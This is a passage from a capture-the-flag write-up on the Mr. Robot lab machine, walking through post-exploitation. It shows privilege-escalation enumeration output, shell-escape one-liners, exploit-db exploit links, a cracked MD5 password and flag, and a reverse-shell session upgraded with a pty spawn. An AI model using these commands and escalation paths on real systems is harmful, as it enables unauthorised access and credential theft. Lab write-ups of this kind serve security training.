+             monit 1:5.6-2  utility for monitoring and managing daemons or similar programs
+    root 23 13:43 0:00 [md]
+    root 7 13:43 5:03 [rcu_sched]
+    root 47 13:43 0:00 [scsi_eh_1]
+    root 20 13:43 0:00 [kblockd]
+    root 1505 13:44 0:02 php-fpm:
+    root 46 13:43 0:00 [scsi_eh_0]
+    root 21 13:43 0:00 [ata_sff]
+    root 5 13:43 0:00 [kworker/0:0H]
+    root 997 13:43 0:00 /sbin/getty
+    root 49 13:43 0:00 [kworker/u2:3]
+    root 681 13:43 0:00 upstart-socket-bridge
+    root 70 13:43 0:04 [kworker/u2:4]
+    root 18 13:43 0:00 [bioset]
+    root 8 13:43 9:06 [rcuos/0]
+    root 44 13:43 0:00 [kthrotld]
+    root 32 13:43 0:00 [crypto]
+    root 130 13:43 0:00 [ext4-rsv-conver]
+    root 898 13:43 0:00 /usr/sbin/vsftpd
+        Possible Related Packages: 
+             vsftpd 3.0.2-1ubuntu2.14.04.1  lightweight, efficient FTP server written for security
+    root 2325 18:40 0:01 [kworker/u3:2]
+    root 962 13:43 0:00 /sbin/getty
+    root 958 13:43 0:00 /sbin/getty
+    root 960 13:43 0:00 /sbin/getty
+    root 24 13:43 0:00 [devfreq_wq]
+    root 1167 13:43 0:00 /bin/sh
+    root 1 13:43 0:00 /sbin/init
+        Possible Related Packages: 
+             busybox-initramfs 1:1.21.0-1ubuntu1  Standalone shell setup for initramfs
+             init-system-helpers 1.14  helper tools for all init systems
+             initramfs-tools 0.103ubuntu4.2  tools for generating an initramfs
+             initramfs-tools-bin 0.103ubuntu4.2  binaries used by initramfs-tools
+             initscripts 2.88dsf-41ubuntu6.2  scripts for initializing and shutting down the system
+             insserv 1.14.0-5ubuntu2  boot sequence organizer using LSB init.d script dependency information
+             libklibc 2.0.3-0ubuntu1  minimal libc subset for use with initramfs
+             lsb-base 4.1+Debian11ubuntu6  Linux Standard Base 4.1 init script functionality
+             module-init-tools 15-0ubuntu6  transitional dummy package (module-init-tools to kmod)
+             ncurses-base 5.9+20140118-1ubuntu1  basic terminal type definitions
+             ncurses-term 5.9+20140118-1ubuntu1  additional terminal type definitions
+             sysvinit-utils 2.88dsf-41ubuntu6.2  System-V-like utilities
+             upstart 1.12.1-0ubuntu4.2  event-based init daemon
+    root 1018 13:43 0:00 cron
+        Possible Related Packages: 
+             cron 3.0pl1-124ubuntu2  process scheduling daemon
+    root 9 13:43 0:00 [rcu_bh]
+    root 2493 20:49 0:00 [kauditd]
+    root 25 13:43 0:51 [kworker/0:1]
+    root 68 13:43 0:00 [deferwq]
+    root 4 13:43 0:00 [kworker/0:0]
+    root 30 13:43 0:00 [fsnotify_mark]
+    root 29 13:43 0:00 [ksmd]
+    root 13 13:43 0:00 [khelper]
+    root 28 13:43 0:02 [kswapd0]
+    root 2250 18:17 0:05 [kworker/u3:1]
+    root 16 13:43 0:00 [writeback]
+    root 27 13:43 0:00 [khungtaskd]
+    root 31 13:43 0:00 [ecryptfs-kthrea]
+    root 12 13:43 0:01 [watchdog/0]
+    root 269 13:43 0:00 upstart-udev-bridge
+    root 1512 13:44 0:02 /opt/bitnami/apache2/bin/httpd.bin
+    root 22 13:43 0:00 [khubd]
+    root 10 13:43 0:00 [rcuob/0]
+    root 119 13:43 0:00 [kpsmoused]
+    root 129 13:43 1:49 [jbd2/sda1-8]
+    root 321 13:43 0:00 upstart-file-bridge
+    root 742 13:43 0:00 dhclient
+    root 999 13:43 0:00 /sbin/getty
+    root 15 13:43 0:00 [netns]
+
+[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...
+
+[+] Installed Tools
+    /usr/bin/awk
+    /usr/bin/perl
+    /usr/bin/python
+    /usr/bin/gcc
+    /usr/bin/cc
+    /usr/bin/vi
+    /usr/bin/find
+    /bin/netcat
+    /bin/nc
+    /usr/bin/wget
+
+[+] Related Shell Escape Sequences...
+
+    vi-->	:!bash
+    vi-->	:set shell=/bin/bash:shell
+    awk-->	awk 'BEGIN {system("/bin/bash")}'
+    find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+    perl-->	perl -e 'exec "/bin/bash";'
+
+[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...
+
+    Note: Exploits relying on a compile/scripting language not detected on this system are marked with a '**' but should still be tested!
+
+    The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system
+    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c
+
+    The following exploits are applicable to this kernel version and should be investigated as well
+    - Kernel ia32syscall Emulation Privilege Escalation || http://www.exploit-db.com/exploits/15023 || Language=c
+    - Sendpage Local Privilege Escalation || http://www.exploit-db.com/exploits/19933 || Language=ruby**
+    - CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit) || http://www.exploit-db.com/exploits/15944 || Language=c
+    - CAP_SYS_ADMIN to root Exploit || http://www.exploit-db.com/exploits/15916 || Language=c
+    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c
+    - open-time Capability file_ns_capable() Privilege Escalation || http://www.exploit-db.com/exploits/25450 || Language=c
+    - open-time Capability file_ns_capable() - Privilege Escalation Vulnerability || http://www.exploit-db.com/exploits/25307 || Language=c
+
+Finished
+=================================================================================================
+</pre>
+<p><font size="3.5" color="black">I discovered a user that may be interesting (robot).</font></p>
+<p><font size="3.5" color="black">Navigating to /home/robot directory revealed robot's credentials in MD5 hash format:</font></p>
+<pre style="background-color:black;color:white;">
+daemon@linux:/tmp$ ls /home/robot
+ls /home/robot
+key-2-of-3.txt	password.raw-md5
+daemon@linux:/tmp$ cd /home/robot/;ls
+cd /home/robot/;ls
+key-2-of-3.txt	password.raw-md5
+daemon@linux:/home/robot$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+daemon@linux:/home/robot$ cat password.raw-md5
+cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+</pre>
+<br>
+<p><font size="3.5" color="black">https://crackstation.net/ helped me in cracking this hash:</font></p>
+<img src="img/mr_robot_1/14.png" alt="crackstation.net" style="border:1px solid black;">
+<br>
+<br>
+<p><font size="3.5" color="black">I switched to robot's user and I got my second key:</font></p>
+<pre style="background-color:black;color:white;">
+[gandosha@GandoPC 192.168.43.3]$ ncat -lvnp 4444
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 192.168.43.4.
+Ncat: Connection from 192.168.43.4:58935.
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 21:41:16 up  7:57,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+/bin/sh: 0: can't access tty; job control turned off
+$ su robot
+su: must be run from a terminal
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+daemon@linux:/$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:/$ cd /home;ls
+cd /home;ls
+robot
+robot@linux:/home$ cd robot;ls
+cd robot;ls
+key-2-of-3.txt	password.raw-md5
+robot@linux:~$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+</pre>
+<p><font size="3.5" color="black">I used linuxprivchecker.py again:</font></p>
+<pre style="background-color:black;color:white;">
+robot@linux:~$ cd /tmp;ls
+cd /tmp;ls
+linuxprivchecker.py
+robot@linux:/tmp$ python ./linuxprivchecker.py
+python ./linuxprivchecker.py
+=================================================================================================
+LINUX PRIVILEGE ESCALATION CHECKER
+=================================================================================================
+
+[*] GETTING BASIC SYSTEM INFO...
+
+[+] Kernel
+    Linux version 3.13.0-55-generic (buildd@brownie) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015
+
+[+] Hostname
+    linux
+
+[+] Operating System
+    _____          __________      ___.           __
+    /     \\_______  \\______   \\ ____\\_ |__   _____/  |_
+    /  \\ /  \\_  __ \\  |       _//  _ \\| __ \\ /  _ \\   __\\
+    /    Y    \\  | \\/  |    |   (  <_> ) \\_\\ (  <_> )  |
+    \\____|__  /__|     |____|_  /\\____/|___  /\\____/|__|
+    \\/                \\/           \\/
+
+[*] GETTING NETWORKING INFO...
+
+[+] Interfaces
+    eth0      Link encap:Ethernet  HWaddr 08:00:27:b9:68:76
+    inet addr:192.168.43.4  Bcast:192.168.43.255  Mask:255.255.255.0
+    inet6 addr: fe80::a00:27ff:feb9:6876/64 Scope:Link
+    UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+    RX packets:1411557 errors:0 dropped:0 overruns:0 frame:0
+    TX packets:2652371 errors:0 dropped:0 overruns:0 carrier:0
+    collisions:0 txqueuelen:1000
+    RX bytes:521806002 (521.8 MB)  TX bytes:2913673816 (2.9 GB)
+    Interrupt:19 Base address:0xd020
+    lo        Link encap:Local Loopback
+    inet addr:127.0.0.1  Mask:255.0.0.0
+    inet6 addr: ::1/128 Scope:Host
+    UP LOOPBACK RUNNING  MTU:65536  Metric:1
+    RX packets:3122 errors:0 dropped:0 overruns:0 frame:0
+    TX packets:3122 errors:0 dropped:0 overruns:0 carrier:0
+    collisions:0 txqueuelen:0
+    RX bytes:2021774 (2.0 MB)  TX bytes:2021774 (2.0 MB)
+
+[+] Netstat
+    Active Internet connections (servers and established)
+    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+    tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      -
+    tcp        0      0 127.0.0.1:2812          0.0.0.0:*               LISTEN      -
+    tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+    tcp        0      0 192.168.43.4:58935      192.168.43.3:4444       ESTABLISHED 2776/bash
+    tcp        0      0 192.168.43.4:58932      192.168.43.3:4444       CLOSE_WAIT  -
+    tcp        0      0 192.168.43.4:58934      192.168.43.3:4444       CLOSE_WAIT  -
+    tcp6       0      0 :::443                  :::*                    LISTEN      -
+    tcp6       0      0 :::80                   :::*                    LISTEN      -
+    udp        0      0 0.0.0.0:37036           0.0.0.0:*                           -
+    udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+    udp6       0      0 :::9119                 :::*                                -
+
+[+] Route
+    Kernel IP routing table
+    Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+    192.168.43.0    *               255.255.255.0   U     0      0        0 eth0
+
+[*] GETTING FILESYSTEM INFO...
+
+[+] Mount results
+    /dev/sda1 on / type ext4 (rw)
+    proc on /proc type proc (rw)
+    sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)
+    none on /sys/fs/cgroup type tmpfs (rw)
+    none on /sys/fs/fuse/connections type fusectl (rw)
+    none on /sys/kernel/debug type debugfs (rw)
+    none on /sys/kernel/security type securityfs (rw)
+    udev on /dev type devtmpfs (rw,mode=0755)
+    devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=0620)
+    tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)
+    none on /run/lock type tmpfs (rw,noexec,nosuid,nodev,size=5242880)
+    none on /run/shm type tmpfs (rw,nosuid,nodev)
+    none on /run/user type tmpfs (rw,noexec,nosuid,nodev,size=104857600,mode=0755)
+    none on /sys/fs/pstore type pstore (rw)
+
+[+] fstab entries
+    # /etc/fstab: static file system information.
+    # <file system>                                 <mount point>   <type>  <options>       <dump>  <pass>
+    proc                                            /proc           proc    defaults        0       0
+    /dev/sda1                                       /               ext4    defaults        0       0
+    /dev/sda2                                       swap            swap    defaults        0       0
+
+[+] Scheduled cron jobs
+    -rw-r--r-- 1 root root  787 Oct 12 15:30 /etc/crontab
+    /etc/cron.d:
+    total 12
+    drwxr-xr-x  2 root root 4096 Jun 24  2015 .
+    drwxr-xr-x 77 root root 4096 Oct 14 13:43 ..
+    -rw-r--r--  1 root root  102 Feb  9  2013 .placeholder
+    /etc/cron.daily:
+    total 44
+    drwxr-xr-x  2 root root  4096 Jun 24  2015 .
+    drwxr-xr-x 77 root root  4096 Oct 14 13:43 ..
+    -rwxr-xr-x  1 root root 15481 Apr 10  2014 apt
+    -rwxr-xr-x  1 root root   256 Mar  7  2014 dpkg
+    -rwxr-xr-x  1 root root   372 Jan 22  2014 logrotate
+    -rwxr-xr-x  1 root root   249 Feb 17  2014 passwd
+    -rw-r--r--  1 root root   102 Feb  9  2013 .placeholder
+    -rwxr-xr-x  1 root root   328 Jul 18  2014 upstart
+    /etc/cron.hourly:
+    total 12
+    drwxr-xr-x  2 root root 4096 Jun 24  2015 .
+    drwxr-xr-x 77 root root 4096 Oct 14 13:43 ..
+    -rw-r--r--  1 root root  102 Feb  9  2013 .placeholder
+    /etc/cron.monthly:
+    total 12
+    drwxr-xr-x  2 root root 4096 Jun 24  2015 .
+    drwxr-xr-x 77 root root 4096 Oct 14 13:43 ..
+    -rw-r--r--  1 root root  102 Feb  9  2013 .placeholder
+    /etc/cron.weekly:
+    total 16
+    drwxr-xr-x  2 root root 4096 Jun 24  2015 .
+    drwxr-xr-x 77 root root 4096 Oct 14 13:43 ..
+    -rwxr-xr-x  1 root root  427 Apr 16  2014 fstrim
+    -rw-r--r--  1 root root  102 Feb  9  2013 .placeholder
+
+[+] Writable cron dirs
+
+
+[*] ENUMERATING USER AND ENVIRONMENTAL INFO...
+
+[+] Logged in User Activity
+    21:43:12 up  7:59,  0 users,  load average: 0.00, 0.01, 0.05
+    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Super Users Found:
+    root
+
+[+] Environment
+    CURL_CA_BUNDLE=/opt/bitnami/common/openssl/certs/curl-ca-bundle.crt
+    GS_LIB=
+    MAIL=/var/mail/robot
+    USER=robot
+    LDAPCONF=/opt/bitnami/common/etc/openldap/ldap.conf
+    SHLVL=2
+    HOME=/home/robot
+    OLDPWD=/home/robot
+    SSL_CERT_FILE=/opt/bitnami/common/openssl/certs/curl-ca-bundle.crt
+    OPENSSL_ENGINES=/opt/bitnami/common/lib/engines
+    FREETDSLOCALES=
+    LOGNAME=robot
+    _=/usr/bin/python
+    MAGICK_CONFIGURE_PATH=
+    OPENSSL_CONF=/opt/bitnami/common/openssl/openssl.cnf
+    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+    MAGICK_CODER_MODULE_PATH=
+    LANG=en_US.UTF-8
+    MAGICK_HOME=
+    SHELL=/bin/bash
+    FREETDSCONF=
+    PWD=/tmp
+
+[+] Root and current user history (depends on privs)
+
+[+] Sudoers (privileged)
+
+[+] All users
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    sync:x:4:65534:sync:/bin:/bin/sync
+    games:x:5:60:games:/usr/games:/usr/sbin/nologin
+    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+    libuuid:x:100:101::/var/lib/libuuid:
+    syslog:x:101:104::/home/syslog:/bin/false
+    sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+    ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
+    bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
+    mysql:x:1001:1001::/home/mysql:
+    varnish:x:999:999::/home/varnish:
+    robot:x:1002:1002::/home/robot:
+
+[+] Current User
+    robot
+
+[+] Current User ID
+    uid=1002(robot) gid=1002(robot) groups=1002(robot)
+
+[*] ENUMERATING FILE AND DIRECTORY PERMISSIONS/CONTENTS...
+
+[+] World Writeable Directories for User/Group 'Root'
+    drwxrwxrwt 2 root root 40 Oct 14 13:43 /run/shm
+    drwxrwxrwt 3 root root 60 Oct 14 13:43 /run/lock
+    drwxrwxrwx 2 root root 4096 Oct 14 21:10 /opt/bitnami/mysql/tmp
+    drwxrwxrwx 2 root root 4096 Oct 14 20:49 /opt/bitnami/php/tmp
+    drwxrwxrwt 2 root root 4096 Nov 13  2015 /var/tmp
+    drwxrwxrwt 4 root root 4096 Oct 14 21:01 /tmp
+    drwxrwxrwt 2 root root 4096 Oct 14 13:43 /tmp/.ICE-unix
+    drwxrwxrwt 2 root root 4096 Oct 14 13:43 /tmp/.X11-unix
+
+[+] World Writeable Directories for Users other than Root
+
+[+] World Writable Files
+    -rwxrwxrwx 1 root root 1208 Dec 29  2005 /opt/bitnami/licenses/expat.txt
+    -rw-rw-rw- 1 root root 1861 Nov 27  2003 /opt/bitnami/licenses/cyrus-sasl.txt
+    -rw-rw-rw- 1 root root 0 Oct 14 10:44 /sys/kernel/security/apparmor/.access
+    -rwxrwxrwx 1 daemon daemon 25304 Sep 16 14:14 /tmp/linuxprivchecker.py
+
+[+] Checking if root's home folder is accessible
+
+[+] SUID/SGID Files and Directories
+    -rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+    -rwsr-xr-x 1 root root 69120 Feb 12  2015 /bin/umount
+    -rwsr-xr-x 1 root root 94792 Feb 12  2015 /bin/mount
+    -rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+    -rwsr-xr-x 1 root root 36936 Feb 17  2014 /bin/su
+    -rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-touchlock
+    -rwsr-xr-x 1 root root 47032 Feb 17  2014 /usr/bin/passwd
+    -rwsr-xr-x 1 root root 32464 Feb 17  2014 /usr/bin/newgrp
+    -rwxr-sr-x 1 root utmp 421768 Nov  7  2013 /usr/bin/screen
+    -rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-unlock
+    -rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-lock
+    -rwsr-xr-x 1 root root 41336 Feb 17  2014 /usr/bin/chsh
+    -rwxr-sr-x 1 root crontab 35984 Feb  9  2013 /usr/bin/crontab
+    -rwsr-xr-x 1 root root 46424 Feb 17  2014 /usr/bin/chfn
+    -rwxr-sr-x 1 root shadow 54968 Feb 17  2014 /usr/bin/chage
+    -rwsr-xr-x 1 root root 68152 Feb 17  2014 /usr/bin/gpasswd
+    -rwxr-sr-x 1 root shadow 23360 Feb 17  2014 /usr/bin/expiry
+    -rwxr-sr-x 1 root mail 14856 Dec  7  2013 /usr/bin/dotlockfile
+    -rwsr-xr-x 1 root root 155008 Mar 12  2015 /usr/bin/sudo
+    -rwxr-sr-x 1 root ssh 284784 May 12  2014 /usr/bin/ssh-agent
+    -rwxr-sr-x 1 root tty 19024 Feb 12  2015 /usr/bin/wall
+    -rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
+    drwxrwsr-x 6 root staff 4096 Jun 24  2015 /usr/local/share/xml
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/xml/schema
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/xml/declaration
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/xml/misc
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/xml/entities
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/ca-certificates
+    drwxrwsr-x 7 root staff 4096 Jun 24  2015 /usr/local/share/sgml
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/sgml/dtd
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/sgml/declaration
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/sgml/stylesheet
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/sgml/misc
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/sgml/entities
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/share/fonts
+    drwxrwsr-x 4 root staff 4096 Jun 24  2015 /usr/local/lib/python2.7
+    drwxrwsr-x 2 root staff 4096 Nov 13  2015 /usr/local/lib/python2.7/dist-packages
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/lib/python2.7/site-packages
+    drwxrwsr-x 3 root staff 4096 Jun 24  2015 /usr/local/lib/python3.4
+    drwxrwsr-x 2 root staff 4096 Jun 24  2015 /usr/local/lib/python3.4/dist-packages
+    -rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
+    -rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
+    -r-sr-xr-x 1 root root 9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+    -r-sr-xr-x 1 root root 14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+    -rwsr-xr-x 1 root root 10344 Feb 25  2015 /usr/lib/pt_chown
+    drwxrwsr-x 2 root staff 4096 Apr 10  2014 /var/local
+    drwxrwsr-x 2 libuuid libuuid 4096 Jun 24  2015 /var/lib/libuuid
+    drwxrwsr-x 2 root mail 4096 Jun 24  2015 /var/mail
+    -rwxr-sr-x 1 root shadow 35536 Jan 31  2014 /sbin/unix_chkpwd
+
+[+] Logs containing keyword 'password'
+    Shadow passwords are now on.
+
+[+] Config files containing keyword 'password'
+    /etc/debconf.conf:# World-readable, and accepts everything but passwords.
+    /etc/debconf.conf:Reject-Type: password
+    /etc/debconf.conf:# Not world readable (the default), and accepts only passwords.
+    /etc/debconf.conf:Name: passwords
+    /etc/debconf.conf:Accept-Type: password
+    /etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
+    /etc/debconf.conf:# databases, one to hold passwords and one for everything else.
+    /etc/debconf.conf:Stack: config, passwords
+    /etc/debconf.conf:# A remote LDAP database. It is also read-only. The password is really
+    /etc/ssl/openssl.cnf:# input_password = secret
+    /etc/ssl/openssl.cnf:# output_password = secret
+    /etc/ssl/openssl.cnf:challengePassword		= A challenge password
+
+[+] Shadow File (Privileged)
+
+[*] ENUMERATING PROCESSES AND APPLICATIONS...
+
+[+] Installed Packages
+    Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
+    Err?=(none)/Reinst-required (Status,Err:
+    Name Version  Description
+    adduser 3.113+nmu3ubuntu3  add and remove users and groups
+    apt 1.0.1ubuntu2.8  commandline package manager
+    apt-utils 1.0.1ubuntu2.8  package management related utility programs
+    autoconf 2.69-6  automatic configure script builder
+    automake 1:1.14.1-2ubuntu1  Tool for generating GNU Standards-compliant Makefiles
+    autotools-dev 20130810.1  Update infrastructure for config.{guess,sub} files
+    base-files 7.2ubuntu5.2  Debian base system miscellaneous files
+    base-passwd 3.5.33  Debian base system master password and group files
+    bash 4.3-7ubuntu1.5  GNU Bourne Again SHell
+    binutils 2.24-5ubuntu13  GNU assembler, linker and binary utilities
+    bsdutils 1:2.20.1-5.1ubuntu20.4  Basic utilities from 4.4BSD-Lite
+    build-essential 11.6ubuntu6  Informational list of build-essential packages
+    busybox-initramfs 1:1.21.0-1ubuntu1  Standalone shell setup for initramfs
+    bzip2 1.0.6-5  high-quality block-sorting file compressor - utilities
+    ca-certificates 20141019ubuntu0.14.04.1  Common CA certificates
+    console-setup 1.70ubuntu8  console font and keymap setup program
+    coreutils 8.21-1ubuntu5.1  GNU core utilities
+    cpio 2.11+dfsg-1ubuntu1.1  GNU cpio -- a program to manage archives of files
+    cpp 4:4.8.2-1ubuntu6  GNU C preprocessor (cpp)
+    cpp-4.8 4.8.4-2ubuntu1~14.04  GNU C preprocessor
+    cron 3.0pl1-124ubuntu2  process scheduling daemon
+    curl 7.35.0-1ubuntu2.5  command line tool for transferring data with URL syntax
+    dash 0.5.7-4ubuntu1  POSIX-compliant shell
+    debconf 1.5.51ubuntu2  Debian configuration management system
+    debconf-i18n 1.5.51ubuntu2  full internationalization support for debconf
+    debianutils 4.4  Miscellaneous utilities specific to Debian
+    dh-python 1.20140128-1ubuntu8  Debian helper tools for packaging Python libraries and applications
+    diffutils 1:3.3-1  File comparison utilities
+    dmsetup 2:1.02.77-6ubuntu2  Linux Kernel Device Mapper userspace library
+    dpkg 1.17.5ubuntu5.4  Debian package management system
+    dpkg-dev 1.17.5ubuntu5.4  Debian package development tools
+    e2fslibs:amd64 1.42.9-3ubuntu1.2  ext2/ext3/ext4 file system libraries
+    e2fsprogs 1.42.9-3ubuntu1.2  ext2/ext3/ext4 file system utilities
+    eject 2.1.5+deb1+cvs20081104-13.1  ejects CDs and operates CD-Changers under Linux
+    fakeroot 1.20-3ubuntu2  tool for simulating superuser privileges
+    file 1:5.14-2ubuntu3.3  Determines file type using "magic" numbers
+    findutils 4.4.2-7  utilities for finding files--find, xargs
+    fontconfig 2.11.0-0ubuntu4.1  generic font configuration library - support binaries
+    fontconfig-config 2.11.0-0ubuntu4.1  generic font configuration library - configuration
+    fonts-dejavu-core 2.34-1ubuntu1  Vera font family derivate with additional characters
+    g++ 4:4.8.2-1ubuntu6  GNU C++ compiler
+    g++-4.8 4.8.4-2ubuntu1~14.04  GNU C++ compiler
+    gcc 4:4.8.2-1ubuntu6  GNU C compiler
+    gcc-4.8 4.8.4-2ubuntu1~14.04  GNU C compiler
+    gcc-4.8-base:amd64 4.8.4-2ubuntu1~14.04  GCC, the GNU Compiler Collection (base package)
+    gcc-4.9-base:amd64 4.9.1-0ubuntu1  GCC, the GNU Compiler Collection (base package)
+    gettext-base 0.18.3.1-1ubuntu3  GNU Internationalization utilities for the base system
+    gnupg 1.4.16-1ubuntu2.3  GNU privacy guard - a free PGP replacement
+    gpgv 1.4.16-1ubuntu2.3  GNU privacy guard - signature verification tool
+    grep 2.16-1  GNU grep, egrep and fgrep
+    grub 0.97-29ubuntu66  GRand Unified Bootloader (Legacy version)
+    grub-common 2.02~beta2-9ubuntu1.2  GRand Unified Bootloader (common files)
+    gzip 1.6-3ubuntu1  GNU compression utilities
+    hostname 3.15ubuntu1  utility to set/show the host name or domain name
+    ifupdown 0.7.47.2ubuntu4.1  high level tools to configure network interfaces
+    init-system-helpers 1.14  helper tools for all init systems
+    initramfs-tools 0.103ubuntu4.2  tools for generating an initramfs
+    initramfs-tools-bin 0.103ubuntu4.2  binaries used by initramfs-tools
+    initscripts 2.88dsf-41ubuntu6.2  scripts for initializing and shutting down the system
+    insserv 1.14.0-5ubuntu2  boot sequence organizer using LSB init.d script dependency information
+    iproute2 3.12.0-2  networking and traffic control tools
+    iptables 1.4.21-1ubuntu1  administration tools for packet filtering and NAT
+    iputils-ping 3:20121221-4ubuntu1.1  Tools to test the reachability of network hosts
+    isc-dhcp-client 4.2.4-7ubuntu12.2  ISC DHCP client
+    isc-dhcp-common 4.2.4-7ubuntu12.2  common files used by all the isc-dhcp* packages
+    kbd 1.15.5-1ubuntu1  Linux console font and keytable utilities
+    keyboard-configuration 1.70ubuntu8  system-wide keyboard preferences
+    klibc-utils 2.0.3-0ubuntu1  small utilities built with klibc for early boot
+    kmod 15-0ubuntu6  tools for managing Linux kernel modules
+    krb5-locales 1.12+dfsg-2ubuntu5.1  Internationalization support for MIT Kerberos
+    less 458-2  pager program similar to more
+    libacl1:amd64 2.2.52-1  Access control list shared library
+    libalgorithm-diff-perl 1.19.02-3  module to find differences between files
+    libalgorithm-diff-xs-perl 0.04-2build4  module to find differences between files (XS accelerated)
+    libalgorithm-merge-perl 0.08-2  Perl module for three-way merge of textual data
+    libapt-inst1.5:amd64 1.0.1ubuntu2.8  deb package format runtime library
+    libapt-pkg4.12:amd64 1.0.1ubuntu2.8  package management runtime library
+    libarchive-extract-perl 0.70-1  generic archive extracting module
+    libasan0:amd64 4.8.4-2ubuntu1~14.04  AddressSanitizer -- a fast memory error detector
+    libasn1-8-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1.1  Heimdal Kerberos - ASN.1 library
+    libasprintf0c2:amd64 0.18.3.1-1ubuntu3  GNU library to use fprintf and friends in C++
+    libatomic1:amd64 4.8.4-2ubuntu1~14.04  support library providing __atomic built-in functions
+    libattr1:amd64 1:2.4.47-1ubuntu1  Extended attribute shared library
+    libaudit-common 1:2.3.2-2ubuntu1  Dynamic library for security auditing - common files
+    libaudit1:amd64 1:2.3.2-2ubuntu1  Dynamic library for security auditing
+    libavahi-client3:amd64 0.6.31-4ubuntu1  Avahi client library
+    libavahi-common-data:amd64 0.6.31-4ubuntu1  Avahi common data files
+    libavahi-common3:amd64 0.6.31-4ubuntu1  Avahi common library
+    libblkid1:amd64 2.20.1-5.1ubuntu20.4  block device id library
+    libbsd0:amd64 0.6.0-2ubuntu1  utility functions from BSD systems - shared library
+    libbz2-1.0:amd64 1.0.6-5  high-quality block-sorting file compressor library - runtime
